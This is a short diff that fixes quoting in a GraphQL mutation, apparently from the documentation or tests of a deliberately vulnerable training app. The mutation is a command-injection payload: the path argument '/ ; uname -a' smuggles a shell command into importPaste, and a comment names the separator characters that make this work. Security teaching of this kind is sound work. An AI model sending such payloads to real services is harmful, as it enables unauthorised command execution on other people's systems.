@@ -21,7 +21,7 @@
 
 # Import Paste allows specifying UNIX characters to break out of the URL provided to importPaste, using characters such as ";" "&&", "||", and more.
 mutation  {
-  importPaste(host:'localhost', port:80, path:"/ ; uname -a", scheme:"http"){
+  importPaste(host:"localhost", port:80, path:"/ ; uname -a", scheme:"http"){
     result
   }
 }
